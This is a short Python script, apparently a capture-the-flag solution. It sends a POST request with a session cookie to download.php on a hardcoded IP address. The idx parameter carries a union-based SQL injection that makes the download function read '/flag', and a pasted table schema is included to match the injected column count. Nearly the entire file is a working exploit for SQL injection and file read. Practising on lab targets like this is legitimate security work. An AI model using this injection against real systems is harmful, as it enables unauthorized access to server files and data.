from requests import post

cookie='PHPSESSID=5c63b105a5752b4cc7a27dc2555ccc30'

headers={
        'Cookie': cookie,
        'Content-Type': 'application/x-www-form-urlencoded',
        }


'''
  `idx` int(11) NOT NULL AUTO_INCREMENT,
  `title` text,
  `content` text,
  `file_path` varchar(200) DEFAULT NULL,
  `file_name` varchar(200) DEFAULT NULL,
  `require_level` int(10) DEFAULT NULL,
  `id` varchar(50) DEFAULT NULL,
  `date` varchar(50) DEFAULT NULL,<Paste>
'''
url = "http://54.180.79.80/download.php?idx=12313' union select 1,1,1,'/flag','x',1,1,1%23"
c = post(url, headers=headers, data={'idx': '1'})
print(c.status_code)
print(c.text)
